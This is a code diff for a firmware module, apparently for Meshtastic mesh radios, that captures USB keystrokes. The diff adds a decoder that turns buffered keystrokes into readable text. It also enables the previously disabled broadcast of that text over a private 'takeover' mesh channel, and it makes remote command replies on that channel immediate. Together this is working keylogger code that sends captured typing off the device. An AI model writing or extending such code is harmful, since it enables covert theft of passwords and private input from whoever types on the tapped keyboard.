@@ -155,7 +155,7 @@ int32_t USBCaptureModule::runOnce()
 
         /* Use busy-wait instead of delay() to avoid scheduler issues */
         uint32_t start = millis();
-        while (millis() - start < 100)
+        while (millis() - start < CORE1_LAUNCH_DELAY_MS)
         {
             tight_loop_contents();
         }
@@ -177,7 +177,62 @@ int32_t USBCaptureModule::runOnce()
     /* Note: Formatted event logging now happens directly on Core1 */
 
     /* Poll every 20 seconds to reduce overhead */
-    return 20000;
+    return RUNONCE_INTERVAL_MS;
+}
+
+/**
+ * @brief Decode binary keystroke buffer into human-readable text
+ *
+ * Converts raw buffer data (with delta encoding) into plain text that
+ * can be displayed on receiving devices' phone apps.
+ *
+ * @param buffer Source buffer with binary keystroke data
+ * @param output Destination buffer for decoded text
+ * @param max_len Maximum output buffer size
+ * @return Length of decoded text
+ */
+size_t USBCaptureModule::decodeBufferToText(const psram_keystroke_buffer_t *buffer,
+                                            char *output, size_t max_len)
+{
+    size_t out_pos = 0;
+
+    /* Add header with timestamp */
+    out_pos += snprintf(output + out_pos, max_len - out_pos,
+                       "[%u→%u] ", buffer->start_epoch, buffer->final_epoch);
+
+    /* Decode keystroke data */
+    for (size_t i = 0; i < buffer->data_length && out_pos < max_len - 1; i++)
+    {
+        unsigned char c = (unsigned char)buffer->data[i];
+
+        /* Check for delta marker (Enter key with timestamp) */
+        if (c == 0xFF && (i + 2) < buffer->data_length)
+        {
+            /* Read 2-byte delta */
+            uint16_t delta = ((unsigned char)buffer->data[i + 1] << 8) |
+                             (unsigned char)buffer->data[i + 2];
+
+            /* Add newline for Enter key */
+            if (out_pos < max_len - 1) {
+                output[out_pos++] = '\n';
+            }
+
+            i += 2; /* Skip delta bytes */
+            continue;
+        }
+
+        /* Copy regular characters */
+        if (c >= PRINTABLE_CHAR_MIN && c < PRINTABLE_CHAR_MAX) {
+            output[out_pos++] = c;
+        } else if (c == '\t' && out_pos < max_len - 1) {
+            output[out_pos++] = '\t';
+        } else if (c == '\b' && out_pos < max_len - 1) {
+            output[out_pos++] = '\b';
+        }
+    }
+
+    output[out_pos] = '\0';
+    return out_pos;
 }
 
 /**
@@ -189,32 +244,34 @@ int32_t USBCaptureModule::runOnce()
  * Processing Flow:
  *  1. Check if PSRAM has data (psram_buffer_read)
  *  2. Read complete buffer (already formatted by Core1)
- *  3. Log buffer content with decoded timestamps
- *  4. Transmit buffer (currently disabled, ready to enable)
- *  5. Repeat while buffers available
- *  6. Log statistics every 10 seconds
+ *  3. Decode binary buffer to human-readable text
+ *  4. Log buffer content with decoded timestamps
+ *  5. Transmit decoded text (rate-limited to prevent mesh flooding)
+ *  6. Repeat while buffers available
+ *  7. Log statistics every 10 seconds
  *
  * Performance:
- *  - Ultra-lightweight: Just memcpy + transmit
+ *  - Ultra-lightweight: Just memcpy + decode + transmit
  *  - No formatting overhead (done by Core1)
  *  - No buffer management (done by Core1)
  *  - Estimated CPU: ~0.2% (vs 2% before)
  *
  * @note Called every 100ms from runOnce()
- * @note Processes ALL available buffers each cycle (non-blocking)
+ * @note Rate-limited to 1 transmission per 6 seconds to prevent mesh flooding
  * @note Statistics: available, total_transmitted, dropped_buffers
  */
 void USBCaptureModule::processPSRAMBuffers()
 {
     psram_keystroke_buffer_t buffer;
+    static uint32_t last_transmit_time = 0;
 
     /* Skip processing if capture is disabled */
     if (!capture_enabled) {
         return;
     }
 
-    /* Process all available buffers */
-    while (psram_buffer_read(&buffer))
+    /* Process only ONE buffer per call to avoid flooding */
+    if (psram_buffer_read(&buffer))
     {
         LOG_INFO("[Core0] Transmitting buffer: %u bytes (uptime %u → %u seconds)",
                 buffer.data_length, buffer.start_epoch, buffer.final_epoch);
@@ -224,7 +281,7 @@ void USBCaptureModule::processPSRAMBuffers()
         LOG_INFO("Start Time: %u seconds (uptime since boot)", buffer.start_epoch);
 
         /* Log data in chunks to avoid line length issues */
-        char line_buffer[128];
+        char line_buffer[MAX_LINE_BUFFER_SIZE];
         size_t line_pos = 0;
 
         for (size_t i = 0; i < buffer.data_length; i++)
@@ -271,7 +328,7 @@ void USBCaptureModule::processPSRAMBuffers()
                     line_buffer[line_pos++] = 'b';
                 }
             }
-            else if (c >= 32 && c < 127)
+            else if (c >= PRINTABLE_CHAR_MIN && c < PRINTABLE_CHAR_MAX)
             {
                 if (line_pos < sizeof(line_buffer) - 1)
                 {
@@ -290,16 +347,36 @@ void USBCaptureModule::processPSRAMBuffers()
         LOG_INFO("Final Time: %u seconds (uptime since boot)", buffer.final_epoch);
         LOG_INFO("=== BUFFER END ===");
 
-        /* Transmit directly (data already formatted by Core1!) */
-        // Note: Transmission is currently disabled, but when enabled,
-        // Core0 just reads complete buffers from PSRAM and transmits them
-        // broadcastToPrivateChannel((const uint8_t *)buffer.data, buffer.data_length);
+        /* Decode buffer to human-readable text */
+        /* TODO: Future FRAM implementation - transmit binary encrypted data instead of decoded text
+         *       Once FRAM storage is implemented, we should:
+         *       1. Keep binary buffer format for efficient storage
+         *       2. Encrypt binary data before transmission
+         *       3. Receiving nodes decrypt and decode on their end
+         *       For now, decode to text so phone apps can display it */
+        char decoded_text[MAX_DECODED_TEXT_SIZE];
+        size_t text_len = decodeBufferToText(&buffer, decoded_text, sizeof(decoded_text));
+
+        /* Rate limiting: Only transmit if enough time has passed */
+        uint32_t now = millis();
+        if (now - last_transmit_time >= MIN_TRANSMIT_INTERVAL_MS)
+        {
+            /* Transmit decoded text (readable on phone app) */
+            broadcastToPrivateChannel((const uint8_t *)decoded_text, text_len);
+            last_transmit_time = now;
+            LOG_INFO("[Core0] Transmitted decoded text (%zu bytes)", text_len);
+        }
+        else
+        {
+            LOG_WARN("[Core0] Rate limit: skipping transmission (wait %u ms)",
+                     MIN_TRANSMIT_INTERVAL_MS - (now - last_transmit_time));
+        }
     }
 
     /* Log statistics periodically */
     static uint32_t last_stats_time = 0;
     uint32_t now = millis();
-    if (now - last_stats_time > 10000)
+    if (now - last_stats_time > STATS_LOG_INTERVAL_MS)
     {
         LOG_INFO("[Core0] PSRAM buffers: %u available, %u total transmitted, %u dropped",
                 psram_buffer_get_count(),
@@ -407,45 +484,17 @@ ProcessMessage USBCaptureModule::handleReceived(const meshtastic_MeshPacket &mp)
 
     LOG_INFO("[USBCapture] Received command from node 0x%08x on takeover channel", mp.from);
 
-    /* Command will be processed in allocReply() if want_response is set */
-    /* For now, we stop processing to handle this command */
-    return ProcessMessage::STOP;
-}
-
-meshtastic_MeshPacket *USBCaptureModule::allocReply()
-{
-    /* Verify we have a request to reply to */
-    if (!currentRequest) {
-        return nullptr;
-    }
-
-    /* Parse command from request */
-    USBCaptureCommand cmd = parseCommand(
-        currentRequest->decoded.payload.bytes,
-        currentRequest->decoded.payload.size
-    );
-
-    /* Allocate response packet */
-    auto reply = allocDataPacket();
-    if (!reply) {
-        LOG_ERROR("[USBCapture] Failed to allocate reply packet");
-        return nullptr;
-    }
-
-    /* Execute command and generate response */
-    char response[200];
+    /* Execute command and send reply immediately */
+    char response[MAX_COMMAND_RESPONSE_SIZE];
     size_t len = executeCommand(cmd, response, sizeof(response));
 
-    /* Copy response to packet */
-    reply->decoded.payload.size = len;
-    memcpy(reply->decoded.payload.bytes, response, len);
+    /* Send response back to sender on takeover channel */
+    if (len > 0) {
+        broadcastToPrivateChannel((const uint8_t *)response, len);
+        LOG_INFO("[USBCapture] Sent reply: %.*s", (int)len, response);
+    }
 
-    /* Send reply on the same channel (takeover) */
-    reply->channel = TAKEOVER_CHANNEL_INDEX;
-
-    LOG_INFO("[USBCapture] Sending reply on takeover channel: %.*s", (int)len, response);
-
-    return reply;
+    return ProcessMessage::STOP;
 }
 
 USBCaptureCommand USBCaptureModule::parseCommand(const uint8_t *payload, size_t len)
@@ -455,7 +504,7 @@ USBCaptureCommand USBCaptureModule::parseCommand(const uint8_t *payload, size_t 
     }
 
     /* Convert to uppercase for case-insensitive matching */
-    char cmd[32];
+    char cmd[MAX_COMMAND_LENGTH];
     size_t cmd_len = (len < sizeof(cmd) - 1) ? len : sizeof(cmd) - 1;
 
     for (size_t i = 0; i < cmd_len; i++) {
